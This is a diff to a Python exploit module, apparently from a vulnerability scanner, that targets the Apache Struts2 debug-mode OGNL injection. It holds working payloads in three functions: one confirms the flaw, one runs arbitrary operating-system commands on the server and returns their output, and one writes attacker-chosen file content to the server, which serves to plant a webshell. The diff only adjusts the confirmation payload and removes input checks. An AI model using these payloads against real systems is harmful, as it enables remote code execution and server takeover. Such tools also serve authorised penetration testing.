@@ -18,7 +18,7 @@ def info(data=None):
 def prove(data):
     data = init(data, 'struts')
     if data['url'] != None:
-        prove_poc = '''debug%3dcommand%26expression%3d%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27)%2c%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27)%2c%23resp.setCharacterEncoding(%27UTF-8%27)%2c%23resp.getWriter().print(%22struts2_se%22%2b%22curity_vul%22)%2c%23resp.getWriter().print(%22struts2_security_vul_str2019%22)%2c%23resp.getWriter().flush()%2c%23resp.getWriter().close()'''
+        prove_poc = '''debug%3dcommand%26expression%3d%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27)%2c%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27)%2c%23resp.setCharacterEncoding(%27UTF-8%27)%2c%23resp.getWriter().print(%22struts2_se%22%2b%22curity_vul%22)%2c%23resp.getWriter().print(%22struts2%22+%22_security_vul_str2019%22)%2c%23resp.getWriter().flush()%2c%23resp.getWriter().close()'''
         poc_key = "struts2_security_vul"
         try:
             headers = {'Content-Type': "application/x-www-form-urlencoded"}
@@ -36,9 +36,6 @@ def prove(data):
 def exec(data=None):
     data = init(data, 'struts')
     if data['url'] != None:
-        vulname = ''
-        if 'cmd' not in data.keys():
-            raise Exception("None cmd!")
         cmd = data['cmd']
         exec_poc =  '''debug=command&expression=#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),#resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),#resp.setCharacterEncoding('UTF-8'),#resp.getWriter().print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("%COMMAND%").getInputStream())),#resp.getWriter().flush(),#resp.getWriter().close()'''
         headers = {}
@@ -57,10 +54,6 @@ def upload(data=None):
     data = init(data, 'struts')
     if data['url'] != None:
         upload_poc = '''debug=command&expression=#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),#res=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#res.getWriter().print("oko"),#res.getWriter().print("kok/"),#res.getWriter().print(#req.getContextPath()),#res.getWriter().flush(),#res.getWriter().close(),new java.io.BufferedWriter(new java.io.FileWriter(%PATH%)).append(#req.getParameter("shell")).close()&shell=%FILECONTENT%'''
-        if 'srcpath' not in data.keys():
-            raise Exception("None srcpath ")
-        if 'despath' not in data.keys():
-            raise Exception("None despath ")
         despath = data['despath']
         content = _read_file(data['srcpath'])
         headers = {}
